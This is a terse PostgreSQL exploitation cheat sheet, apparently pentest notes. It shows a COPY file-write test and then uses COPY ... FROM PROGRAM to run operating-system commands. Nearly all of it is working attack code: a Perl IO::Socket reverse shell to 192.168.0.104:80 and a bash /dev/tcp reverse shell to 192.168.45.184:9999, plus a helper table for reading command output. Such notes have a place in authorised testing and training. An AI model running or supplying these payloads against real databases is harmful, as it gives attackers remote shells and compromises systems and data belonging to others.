```
COPY (SELECT 'test') to '/tmp/test.txt';

```


Copy to
```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
OR

COPY files FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/192.168.45.184/9999 0>&1''';



SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;



```


